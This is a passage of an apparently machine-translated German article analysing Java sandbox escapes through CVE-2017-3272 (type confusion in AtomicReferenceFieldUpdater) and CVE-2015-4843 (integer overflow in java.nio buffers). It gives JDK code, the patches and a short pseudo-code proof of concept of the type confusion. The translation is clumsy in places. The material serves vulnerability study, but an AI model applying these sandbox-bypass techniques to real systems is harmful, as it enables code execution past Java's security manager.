class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: AtomicReferenceFieldUpdaterImpl(<span class="keyword">final</span> Class&lt;T&gt; tclass,</span><br><span class="line"> <span class="number">2</span>:                                 <span class="keyword">final</span> Class&lt;V&gt; vclass,</span><br><span class="line"> <span class="number">3</span>:                                 <span class="keyword">final</span> String fieldName,</span><br><span class="line"> <span class="number">4</span>:                                 <span class="keyword">final</span> Class&lt;?&gt; caller) &#123;</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">final</span> Field field;</span><br><span class="line"> <span class="number">6</span>:   <span class="keyword">final</span> Class&lt;?&gt; fieldClass;</span><br><span class="line"> <span class="number">7</span>:   <span class="keyword">final</span> <span class="keyword">int</span> modifiers;</span><br><span class="line"> <span class="number">8</span>:   <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="number">9</span>:     field = AccessController.doPrivileged(</span><br><span class="line"><span class="number">10</span>:       <span class="keyword">new</span> PrivilegedExceptionAction&lt;Field&gt;() &#123;</span><br><span class="line"><span class="number">11</span>:         <span class="function"><span class="keyword">public</span> Field <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">return</span> tclass.getDeclaredField(fieldName);</span><br><span class="line"><span class="number">13</span>:         &#125;</span><br><span class="line"><span class="number">14</span>:       &#125;);</span><br><span class="line"><span class="number">15</span>:     modifiers = field.getModifiers();</span><br><span class="line"><span class="number">16</span>:     sun.reflect.misc.ReflectUtil.ensureMemberAccess(</span><br><span class="line"><span class="number">17</span>:       caller, tclass, <span class="keyword">null</span>, modifiers);</span><br><span class="line"><span class="number">18</span>:     ClassLoader cl = tclass.getClassLoader();</span><br><span class="line"><span class="number">19</span>:     ClassLoader ccl = caller.getClassLoader();</span><br><span class="line"><span class="number">20</span>:     <span class="keyword">if</span> ((ccl != <span class="keyword">null</span>) &amp;&amp; (ccl != cl) &amp;&amp;</span><br><span class="line"><span class="number">21</span>:       ((cl == <span class="keyword">null</span>) || !isAncestor(cl, ccl))) &#123;</span><br><span class="line"><span class="number">22</span>:       sun.reflect.misc.ReflectUtil.checkPackageAccess(tclass);</span><br><span class="line"><span class="number">23</span>:     &#125;</span><br><span class="line"><span class="number">24</span>:     fieldClass = field.getType();</span><br><span class="line"><span class="number">25</span>:   &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line"><span class="number">26</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(pae.getException());</span><br><span class="line"><span class="number">27</span>:   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line"><span class="number">28</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(ex);</span><br><span class="line"><span class="number">29</span>:   &#125;</span><br><span class="line"><span class="number">30</span>:</span><br><span class="line"><span class="number">31</span>:   <span class="keyword">if</span> (vclass != fieldClass)</span><br><span class="line"><span class="number">32</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line"><span class="number">33</span>:</span><br><span class="line"><span class="number">34</span>:   <span class="keyword">if</span> (!Modifier.isVolatile(modifiers))</span><br><span class="line"><span class="number">35</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Must be volatile type"</span>);</span><br><span class="line"><span class="number">36</span>:</span><br><span class="line"><span class="number">37</span>:   <span class="keyword">this</span>.cclass = (Modifier.isProtected(modifiers) &amp;&amp;</span><br><span class="line"><span class="number">38</span>:            caller != tclass) ? caller : <span class="keyword">null</span>;</span><br><span class="line"><span class="number">39</span>:   <span class="keyword">this</span>.tclass = tclass;</span><br><span class="line"><span class="number">40</span>:   <span class="keyword">if</span> (vclass == Object.class)</span><br><span class="line"><span class="number">41</span>:     <span class="keyword">this</span>.vclass = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">42</span>:   <span class="keyword">else</span></span><br><span class="line"><span class="number">43</span>:     <span class="keyword">this</span>.vclass = vclass;</span><br><span class="line"><span class="number">44</span>:   offset = unsafe.objectFieldOffset(field);</span><br><span class="line"><span class="number">45</span>: &#125;</span><br></pre></td></tr></table></figure></p>
<p>Der Konstruktor ruft zuerst das Feld auf, das durch Reflexion aktualisiert werden soll (Zeile 12). Beachten Sie, dass der Reflektionsaufruf funktioniert, auch wenn der Code keine Berechtigungen hat. Dies liegt daran, dass der Aufruf im doPrivileged () - Block ausgeführt wird, der die JVM anweist, bestimmte Operationen zuzulassen, selbst wenn der ursprüngliche Aufrufer diese Berechtigung hat (siehe Abschnitt 2.4). Wenn das Feld ein geschütztes Attribut hat und die Aufruferklasse sich von der Klasse tclass unterscheidet, wird der Aufrufer in der Klasse gespeichert (Zeilen 37-38). Beachten Sie, dass der Aufrufer in der Methode newUpdater () durch den Aufruf von Reflection.getCallerClass () gesetzt wird. Diese Zeilen (37-38) sind seltsam, weil der Klassenaufrufer möglicherweise nicht mit der Klassenklasse in Beziehung steht. Wir werden unten sehen, wo sich diese Schwachstellen befinden. Als nächstes speichert der Konstruktor die Klasse tclass, vclass und verwendet die Referenz unsafe der Klasse <em>Unsafe</em>, um den Offset des Feldes zu erhalten (Zeilen 39-44). Dies ist eine rote Flagge, weil die Klasse <em>Unsafe</em> sehr gefährlich ist. Es kann verwendet werden, um Speicher direkt zu manipulieren, der in Java-Programmen nicht möglich ist. Wenn es direkt oder indirekt in den Händen eines Analysten ist, kann es dazu verwendet werden, die Java-Sandbox zu umgehen.<br>Sobald der Analyst auf das Objekt <em>AtomicReferenceFieldUpdater</em> verweist, kann er die Methode set () aufrufen, um das Feld zu aktualisieren, wie in der folgenden Abbildung gezeigt:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T obj, V newValue)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   accessCheck(obj);</span><br><span class="line"> <span class="number">3</span>:   valueCheck(newValue);</span><br><span class="line"> <span class="number">4</span>:    U.putObjectVolatile(obj, offset, newValue);</span><br><span class="line"> <span class="number">5</span>: &#125;</span><br><span class="line"> <span class="number">6</span>:</span><br><span class="line"> <span class="number">7</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">accessCheck</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line"> <span class="number">8</span>:   <span class="keyword">if</span> (!cclass.isInstance(obj))</span><br><span class="line"> <span class="number">9</span>:     throwAccessCheckException(obj);</span><br><span class="line"><span class="number">10</span>: &#125;</span><br><span class="line"><span class="number">11</span>:</span><br><span class="line"><span class="number">12</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">valueCheck</span><span class="params">(V v)</span> </span>&#123;</span><br><span class="line"><span class="number">13</span>:   <span class="keyword">if</span> (v != <span class="keyword">null</span> &amp;&amp; !(vclass.isInstance(v)))</span><br><span class="line"><span class="number">14</span>:     throwCCE();</span><br><span class="line"><span class="number">15</span>: &#125;</span><br></pre></td></tr></table></figure></p>
<p>Das erste Argument für set (), obj, ist eine Instanz des Referenzfelds, das aktualisiert werden muss. Der zweite Parameter newValue ist der neue Wert des Referenzfeldes. Zuerst überprüft set (), ob obj eine Instanz des ccllass-Typs ist (Zeile 2, Zeilen 7-10). Dann überprüft set (), ob newValue eine Instanz von null oder vclass ist und gibt den Feldtyp an (Zeilen 3, 12-15). Wenn alle Prüfungen bestanden sind, wird die <em>Unsafe</em>-Klasse verwendet, um den neuen Wert an den richtigen Offset im Objekt obj (Zeile 4) zu setzen.<br>Der Patch für diese Sicherheitsanfälligkeit ist unten aufgeführt.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- this.cclass = (Modifier.isProtected(modifiers))</span><br><span class="line">-                ? caller : tclass;</span><br><span class="line">+ this.cclass = (Modifier.isProtected(modifiers)</span><br><span class="line">+             &amp;&amp; tclass.isAssignableFrom(caller)</span><br><span class="line">+             &amp;&amp; !isSamePackage(tclass, caller))</span><br><span class="line">+                ? caller : tclass;</span><br></pre></td></tr></table></figure>
<p>Wie bereits erwähnt, hat der ursprüngliche Code das Aufruferobjekt nicht ausreichend überprüft. In der gepatchten Version überprüft der Code nun, ob die Klasse t die gleiche Klasse wie die Superklasse oder Superschnittstelle des Aufrufers ist. Wie diese Sicherheitsanfälligkeit ausgenutzt wird, wird wie folgt ersichtlich.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="class"><span class="keyword">class</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   <span class="keyword">protected</span> <span class="keyword">volatile</span> A f;</span><br><span class="line"> <span class="number">3</span>: &#125;</span><br><span class="line"> <span class="number">4</span>:</span><br><span class="line"> <span class="number">5</span>: <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line"> <span class="number">6</span>:   <span class="keyword">protected</span> <span class="keyword">volatile</span> B g;</span><br><span class="line"> <span class="number">7</span>:</span><br><span class="line"> <span class="number">8</span>:   main() &#123;</span><br><span class="line"> <span class="number">9</span>:     m = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="number">10</span>:     u = newUpdater(Dummy.class, A.class, <span class="string">"f"</span>);</span><br><span class="line"><span class="number">11</span>:     u.set(m, <span class="keyword">new</span> A());</span><br><span class="line"><span class="number">12</span>:     println(m.g.getClass());</span><br><span class="line"><span class="number">13</span>:   &#125;</span><br><span class="line"><span class="number">14</span>: &#125;</span><br></pre></td></tr></table></figure>
<p>Zuerst wird die Klasse <em>Dummy</em> des Feldes f vom Typ _A_ verwendet, um newUpdater () aufzurufen (Zeilen 1-3, 9, 10). Rufen Sie dann die Methode set () für die Updaterinstanz (Zeile 11) mit der Klasse <em>MyClass</em> auf und rufen Sie den neuen Wert newVal für das Feld f des Typs _A_ auf. Anstelle eines Feldes f vom Typ _A_ hat <em>MyClass</em> ein Feld g vom Typ _B_. Daher ist der tatsächliche g-Typ nach dem Aufrufen von set () _A_, aber die virtuelle Maschine geht davon aus, dass der Typ _B_ ist. Der Aufruf println () wird “Klasse A” anstelle von “Klasse B” (Zeile 12) drucken. Der Zugriff auf diese Instanz der Klasse _A_ erfolgt jedoch über die Methoden und Felder der Klasse _B_.</p>
<h5 id="3-1-3-Diskussion"><a href="#3-1-3-Diskussion" class="headerlink" title="3.1.3 Diskussion"></a>3.1.3 Diskussion</h5><p>Wie bereits erwähnt, wurde die Klasse <em>Atomic * FieldUpdater</em> in Java 1.5 eingeführt. Die Sicherheitsanfälligkeit wurde jedoch nur in Version 1.8_112 erkannt und in der nächsten Version 1.8_121 behoben. Durch die Dichotomiesuche in der Version 1.6_ bis 1.8_112 haben wir festgestellt, dass die Sicherheitslücke erstmals in der Version 1.8_92 auftrat. Weitere Tests zeigten, dass alle dazwischen liegenden Versionen anfällig waren: 1.8_101, 1.8_102 und 1.8_111. Wir haben PoC auch für die erste und letzte Version von Java 1.5 getestet: Sie sind nicht anfällig.<br>Der <em>AtomicReferenceFieldUpdater</em>-Unterschied zwischen Version 1.8_91 (nicht anfällig) und 1.8_92 (anfällig) gibt an, dass die Code-Refactoring-Operation die Semantik aller am Eingabewert durchgeführten Prüfungen nicht beibehalten kann. Der nicht anfällige Code für die Version 1.8_91 wird unten angezeigt.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureProtectedAccess</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   <span class="keyword">if</span> (cclass.isInstance(obj)) &#123;</span><br><span class="line"> <span class="number">3</span>:     <span class="keyword">return</span>;</span><br><span class="line"> <span class="number">4</span>:   &#125;</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(...</span><br><span class="line"> <span class="number">6</span>: &#125;</span><br><span class="line"> <span class="number">7</span>:</span><br><span class="line"> <span class="number">8</span>: <span class="function"><span class="keyword">void</span> <span class="title">updateCheck</span><span class="params">(T obj, V update)</span> </span>&#123;</span><br><span class="line"> <span class="number">9</span>:   <span class="keyword">if</span> (!tclass.isInstance(obj) ||</span><br><span class="line"><span class="number">10</span>:       (update != <span class="keyword">null</span> &amp;&amp; vclass != <span class="keyword">null</span></span><br><span class="line"><span class="number">11</span>:        &amp;&amp; !vclass.isInstance(update)))</span><br><span class="line"><span class="number">12</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line"><span class="number">13</span>:   <span class="keyword">if</span> (cclass != <span class="keyword">null</span>)</span><br><span class="line"><span class="number">14</span>:     ensureProtectedAccess(obj);</span><br><span class="line"><span class="number">15</span>: &#125;</span><br><span class="line"><span class="number">16</span>:</span><br><span class="line"><span class="number">17</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T obj, V newValue)</span> </span>&#123;</span><br><span class="line"><span class="number">18</span>:   <span class="keyword">if</span> (obj == <span class="keyword">null</span> ||</span><br><span class="line"><span class="number">19</span>:       obj.getClass() != tclass ||</span><br><span class="line"><span class="number">20</span>:       cclass != <span class="keyword">null</span> ||</span><br><span class="line"><span class="number">21</span>:       (newValue != <span class="keyword">null</span></span><br><span class="line"><span class="number">22</span>:        &amp;&amp; vclass != <span class="keyword">null</span></span><br><span class="line"><span class="number">23</span>:        &amp;&amp; vclass != newValue.getClass()))</span><br><span class="line"><span class="number">24</span>:       updateCheck(obj, newValue);</span><br><span class="line"><span class="number">25</span>:   unsafe.putObjectVolatile(obj, offset, newValue);</span><br><span class="line"><span class="number">26</span>: &#125;</span><br></pre></td></tr></table></figure>
<p>Wenn sich in einer nicht anfälligen Version der Obj-Typ von der Klasse t und der Typ der Klasse, die das zu aktualisierende Feld enthält, unterscheidet, können zwei Bedingungen erfüllt sein. Der erste ist, dass obj in tclass konvertiert werden kann (Zeilen 9, 12). Der zweite, der nur prüft, ob das Feld geschützt ist, ist, dass obj in ccllass konvertiert werden kann (Zeilen 14, 16).<br>In der angreifbaren Version besteht die Bedingung jedoch darin, dass obj in cclass konvertiert werden kann. Die Bedingung, dass obj in tclass konvertiert werden kann, ist verloren. Das Fehlen einer einzigen Bedingung reicht aus, um eine Sicherheitslücke zu erzeugen, die bei richtiger Verwendung zu einer vollständigen Umgehung der Java-Sandbox führt.<br>Können Sie Typ-Chaos-Angriffe verhindern? In Java wird der Typ o___ des Objekts o aus Performancegründen nicht jedes Mal überprüft, wenn das Objekt o verwendet wird. Wenn Sie den Typ jedes Mal überprüfen, wenn ein Objekt verwendet wird, werden zwar Typ-Confusion-Angriffe verhindert, es verursacht jedoch auch einen Laufzeit-Overhead.</p>
<h4 id="3-2-Integer-Uberlauf"><a href="#3-2-Integer-Uberlauf" class="headerlink" title="3.2 Integer Überlauf"></a>3.2 Integer Überlauf</h4><h5 id="3-2-1-Hintergrund"><a href="#3-2-1-Hintergrund" class="headerlink" title="3.2.1 Hintergrund"></a>3.2.1 Hintergrund</h5><p>Ein Integer-Überlauf tritt auf, wenn das Ergebnis einer arithmetischen Operation zu groß für die Anzahl der Bits in der Variablen ist. In Java verwenden Ganzzahlen 32 Bits, um vorzeichenbehaftete Zahlen darzustellen. Positive Werte haben Werte von 0x00000000 (0) bis 0x7FFFFFFF (2 ^ 31-1). Der Wert des negativen Wertes ist 0x80000000 (-2 ^ 31) bis 0xFFFFFFFF (-1). Wenn der Wert 0x7FFFFFFF (2 ^ 31-1) inkrementiert wird, repräsentiert das Ergebnis nicht 2 ^ 31, sondern (-2 ^ 31). Wie kann ich den Sicherheitsmanager deaktivieren?<br>Im nächsten Abschnitt analysieren wir den Ganzzahlüberlauf von CVE-2015-4843. Eine Ganzzahl wird als Index in einem Array verwendet. Mit Überlauf können wir Werte außerhalb des Arrays lesen / schreiben. Diese Lese / Schreib-Grundelemente werden verwendet, um Typ-Konfusions-Angriffe zu implementieren. Leser haben aus der obigen Beschreibung von CVE-2017-3272 gelernt, dass sich Analysten auf solche Angriffe verlassen können, um den Sicherheitsmanager zu deaktivieren.</p>
<h5 id="3-2-2-Beispiel-CVE-2015-4843"><a href="#3-2-2-Beispiel-CVE-2015-4843" class="headerlink" title="3.2.2 Beispiel: CVE-2015-4843"></a>3.2.2 Beispiel: CVE-2015-4843</h5><p>Redhat’s Bugzilla bietet eine kurze Beschreibung dieser Sicherheitsanfälligkeit. Es zeigt an, dass mehrere Integer-Überläufe in der Klasse Buffers im Paket java.nio gefunden wurden und die Sicherheitsanfälligkeit zum Ausführen von beliebigem Code verwendet werden kann.<br>Vulnerability Patch behebt die Datei tatsächlich java / nio / Direct-X-Buffer.java.template, zur Erzeugung von DirectXBufferY.java Form von Klassen, wobei X “Byte” seine “Char”, “Double”, “Int” , “lang”, “schwimmend” oder “kurz”, Y kann “S”, “U”, “RS” oder “RU” sein. „S“ zeigt an, dass das Array eine vorzeichenbehaftete Zahl enthält, „U“ Zahl ohne Vorzeichen, „RS“ in dem Nur-Lese-Modus unsigned „RU“, und die Anzahl der Symbole in Nur-Lese-Modus. Jede erzeugte Klasse _C_ umschließt ein Array eines bestimmten Typs, der durch die Methode der Klasse _C_ manipuliert werden kann. Zum Beispiel gepackte DirectIntBufferS.java Anordnung eines 32-Bit-Integer-unterzeichnet und Methoden get () und () gesetzt werden als die Elemente der Anordnung definiert, in die interne Array DirectIntBufferS Klasse zu kopieren oder kopieren, um die internen Elemente des Arrays Ein Array außerhalb der Klasse. Das Folgende ist ein Auszug aus dem Schwachstellen-Patch:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:      <span class="function"><span class="keyword">public</span> $Type$Buffer <span class="title">put</span><span class="params">($type$[] src, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">15:  #if[rw]</span><br><span class="line"><span class="number">16</span>: -        <span class="keyword">if</span> ((length &lt;&lt; $LG_BYTES_PER_VALUE$)</span><br><span class="line">               &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">17</span>: +        <span class="keyword">if</span> (((<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$)</span><br><span class="line">               &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">18</span>:              checkBounds(offset, length, src.length);</span><br><span class="line"><span class="number">19</span>:              <span class="keyword">int</span> pos = position();</span><br><span class="line"><span class="number">20</span>:              <span class="keyword">int</span> lim = limit();</span><br><span class="line"><span class="number">21</span>: @@ -<span class="number">364</span>,<span class="number">12</span> +<span class="number">364</span>,<span class="number">16</span> @@</span><br><span class="line"><span class="number">22</span>:</span><br><span class="line">23:  #if[!byte]</span><br><span class="line"><span class="number">24</span>:              <span class="keyword">if</span> (order() != ByteOrder.nativeOrder())</span><br><span class="line"><span class="number">25</span>: -                Bits.copyFrom$Memtype$Array(src,</span><br><span class="line">                       offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">26</span>: -                  ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">27</span>: +                Bits.copyFrom$Memtype$Array(src,</span><br><span class="line"><span class="number">28</span>: +                  (<span class="keyword">long</span>)offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">29</span>: +                  ix(pos),</span><br><span class="line"><span class="number">30</span>: +                  (<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">31</span>:              <span class="keyword">else</span></span><br><span class="line">32:  #end[!byte]</span><br><span class="line"><span class="number">33</span>: -                Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line">                       offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">34</span>: -                  ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">35</span>: +                Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line"><span class="number">36</span>: +                  (<span class="keyword">long</span>)offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">37</span>: +                  ix(pos),</span><br><span class="line"><span class="number">38</span>: +                  (<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">39</span>:              position(pos + length);</span><br></pre></td></tr></table></figure></p>
<p>Korrekturen (Zeilen 17, 28, 36 und 38) umfassen die Umwandlung einer 32-Bit-Ganzzahl in eine 64-Bit-Ganzzahl vor der Durchführung einer Verschiebungsoperation, die einen Ganzzahlüberlauf auf 32 Bits verursachen kann. Die korrigierte Version der put () - Methode, die aus java.nio.DirectIntBufferS.java aus Java 1.8 Update 65 extrahiert wurde, lautet wie folgt:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">354</span>:     <span class="function"><span class="keyword">public</span> IntBuffer <span class="title">put</span><span class="params">(<span class="keyword">int</span>[] src, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="number">355</span>:</span><br><span class="line"><span class="number">356</span>:       <span class="keyword">if</span> (((<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">357</span>:             checkBounds(offset, length, src.length);</span><br><span class="line"><span class="number">358</span>:             <span class="keyword">int</span> pos = position();</span><br><span class="line"><span class="number">359</span>:             <span class="keyword">int</span> lim = limit();</span><br><span class="line"><span class="number">360</span>:             <span class="keyword">assert</span> (pos &lt;= lim);</span><br><span class="line"><span class="number">361</span>:             <span class="keyword">int</span> rem = (pos &lt;= lim ? lim - pos : <span class="number">0</span>);</span><br><span class="line"><span class="number">362</span>:             <span class="keyword">if</span> (length &gt; rem)</span><br><span class="line"><span class="number">363</span>:                 <span class="keyword">throw</span> <span class="keyword">new</span> BufferOverflowException();</span><br><span class="line"><span class="number">364</span>:</span><br><span class="line"><span class="number">365</span>:</span><br><span class="line"><span class="number">366</span>:             <span class="keyword">if</span> (order() != ByteOrder.nativeOrder())</span><br><span class="line"><span class="number">367</span>:                 Bits.copyFromIntArray(src,</span><br><span class="line"><span class="number">368</span>:                                             (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">369</span>:                                             ix(pos),</span><br><span class="line"><span class="number">370</span>:                                             (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="number">371</span>:             <span class="keyword">else</span></span><br><span class="line"><span class="number">372</span>:</span><br><span class="line"><span class="number">373</span>:                 Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line"><span class="number">374</span>:                                    (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">375</span>:                                    ix(pos),</span><br><span class="line"><span class="number">376</span>:                                    (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="number">377</span>:             position(pos + length);</span><br><span class="line"><span class="number">378</span>:       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">379</span>:             <span class="keyword">super</span>.put(src, offset, length);</span><br><span class="line"><span class="number">380</span>:       &#125;</span><br><span class="line"><span class="number">381</span>:       <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line"><span class="number">382</span>:</span><br><span class="line"><span class="number">383</span>:</span><br><span class="line"><span class="number">384</span>:</span><br><span class="line"><span class="number">385</span>:     &#125;</span><br></pre></td></tr></table></figure>
<p>Diese Methode kopiert die Längenelemente im src-Array vom angegebenen Offset in das interne Array. In Zeile 367 wird die Methode Bits.copyFromIntArray () aufgerufen. Diese Java-Methode verwendet einen Verweis auf das Quell-Array, den Offset des Quell-Arrays (in Byte), den Index des Ziel-Arrays in Byte und die Anzahl der Bytes, die als Argumente kopiert werden sollen. Da die letzten drei Parameter Größe und Offset (in Bytes) repräsentieren, müssen sie mit 4 multipliziert werden (linke Verschiebung 2). Dies geschieht für Offset (Zeile 374), Pos (Zeile 375) und Länge (Zeile 376). Beachten Sie, dass für pos die Operation in der ix () -Methode ausgeführt wird.<br>In der anfälligen Version gibt es keine Umwandlung, wodurch der Code anfällig für Integer-Überläufe wird.<br>Ebenso ist die Methode get (), die Elemente von einem inneren Array in ein äußeres Array kopiert, ebenfalls anfällig. Die Methode get () ist der Methode put () sehr ähnlich, nur dass der Aufruf von copyFromIntArray () durch einen Aufruf von copyToIntArray () ersetzt wird:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">262</span>:     <span class="function"><span class="keyword">public</span> IntBuffer <span class="title">get</span><span class="params">(<span class="keyword">int</span>[] dst, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="number">263</span>:</span><br><span class="line">[...]</span><br><span class="line"><span class="number">275</span>:                 Bits.copyToIntArray(ix(pos), dst,</span><br><span class="line"><span class="number">276</span>:                                           (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">277</span>:                                           (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line">[...]</span><br><span class="line"><span class="number">291</span>:     &#125;</span><br></pre></td></tr></table></figure>
<p>Da die Methoden get () und put () sehr ähnlich sind, werden wir nur beschreiben, wie Integer-Überlauf in der Methode get () verwendet wird. Die Methode der Methode put () ist dieselbe.<br>Werfen wir einen Blick auf die Methode Bits.copyFromArray (), die in der Methode get () aufgerufen wird. Diese Methode ist eigentlich eine native Methode:</p>
